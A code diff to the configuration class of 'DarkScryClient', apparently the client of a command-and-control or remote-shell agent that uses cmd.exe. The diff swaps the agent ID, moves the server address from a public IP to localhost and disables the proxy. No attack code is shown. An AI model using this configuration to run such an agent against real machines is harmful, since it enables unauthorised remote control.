@@ -8,14 +8,14 @@ namespace DarkScryClient
 	}
 	internal class Config
 	{
-		public static string agent_id = "60a7105e-3445-4ce3-a672-8cc6756dccb1";
+		public static string agent_id = "8ec24819-1c1f-4e98-95d2-f86ceaeb339f";
 		public static string MainShell = "cmd.exe";
 		public static bool IsMainShellRuning = false;
-                public static string ServerIp = "172.236.98.55";
+                public static string ServerIp = "127.0.0.1";
                 public static readonly string AgentName = "DarkScry Cleint";
                 public static readonly string AgnetVersion = "1.0.0";
 
-		public static readonly bool UseProxy = true;
+		public static readonly bool UseProxy = false;
 		public static string ProxyHost = "localhost";
 		public static readonly ProxyKindOptions ProxyKind = ProxyKindOptions.WebSocketBrowser;
 	}
